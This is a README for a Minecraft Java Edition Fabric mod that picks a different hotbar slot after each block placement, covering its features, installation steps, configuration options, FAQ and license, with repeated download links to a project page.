# Block Randomizer v1.0.0 - Game Script Utility 2026

> A client-side Fabric utility for Minecraft Java Edition that switches the selected hotbar slot after block placement, using configurable slot rules and optional visual feedback.

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-Minecraft%20Java%20Edition-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/bfisher61/block-randomizer-fabric?style=flat-square)](https://github.com/bfisher61/block-randomizer-fabric)

---

<p align="center">
  <a href="https://bfisher61.github.io/block-randomizer-fabric/">
    <img src="https://img.shields.io/badge/Download-Block%20Randomizer%20Script-brightgreen?style=for-the-badge" alt="Download Block Randomizer Script">
  </a>
</p>

> **[Download Block Randomizer](https://bfisher61.github.io/block-randomizer-fabric/)**

---

[Download Latest Build](https://bfisher61.github.io/block-randomizer-fabric/)

---

## What It Does

Block Randomizer is a Fabric mod that runs on the Minecraft Java Edition client and changes the selected hotbar slot once a block has been placed. Rather than repeatedly staying on the current slot, it selects another slot from the set you have permitted in the configuration.

The utility is intended for fast building routines. A toggle keybind controls the feature, while in-game messages and slot markers help show what the mod is doing. Its scope is client-side hotbar management and placement flow; it does not alter the game's core mechanics.

---

## Included Functionality

- Selects a different active hotbar slot after placing a block
- Allows a custom list of hotbar slots to be used for selection
- Provides a keybind to enable or disable the feature
- Reports state changes through in-game feedback
- Adds UI markers to make slot activity easier to follow
- Runs as a client-only Fabric mod for Minecraft Java Edition
- Concentrates on configurable slot handling during building

---

## Installation

1. Get the latest build from the project page.
2. Copy the mod file into your Minecraft Fabric `mods` directory.
3. Launch Minecraft Java Edition through a Fabric profile.
4. To assign a different toggle key, open the in-game controls screen.
5. Configure the eligible hotbar slots for the way you build.

Typical installation sequence:

- Install Fabric Loader for the required game version
- Add Block Randomizer to `.minecraft/mods/`
- Launch the game and confirm that the mod is loaded on the client

---

## Configuration

| Setting | Purpose |
| --- | --- |
| Allowed hotbar slots | Determines which slots may be selected after a placement |
| Toggle keybind | Switches the randomizer on or off during gameplay |
| Status feedback | Determines whether state-change messages appear on screen |
| Slot markers | Shows UI markers for active or eligible slots |

A sample configuration could look like this:

- `toggle_key = <your chosen key>`
- `allowed_slots = 1,2,3,4,5,6,7,8,9`
- `status_feedback = true`
- `slot_markers = true`

---

## Minecraft and Fabric Support

Block Randomizer targets the client side of Minecraft Java Edition running with Fabric. Because its behavior is centered on changing the hotbar after block placement, it is particularly suited to building-oriented workflows.

Current limitations include:

- A Fabric-based Minecraft installation is required
- The mod operates only on the client
- Results are determined by the hotbar slots you mark as eligible
- Keybind and visual feedback behavior follows the in-game configuration

---

## Frequently Asked Questions

**What are the installation steps?**  
Download the build, move it into the Fabric `mods` folder, and start Minecraft using the corresponding Fabric profile.

**Can the selection slots be customized?**  
Yes. You can define the hotbar slots that the mod is allowed to choose.

**How can I disable the feature while playing?**  
Use the included toggle keybind to switch the randomizer off or back on.

**Will the mod indicate its current state?**  
Yes. It can show status messages and slot markers in the game interface.

**Which release does this README describe?**  
The documented release is Block Randomizer v1.0.0.

**Where is the configuration kept?**  
Settings are stored client-side as part of the Fabric installation.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
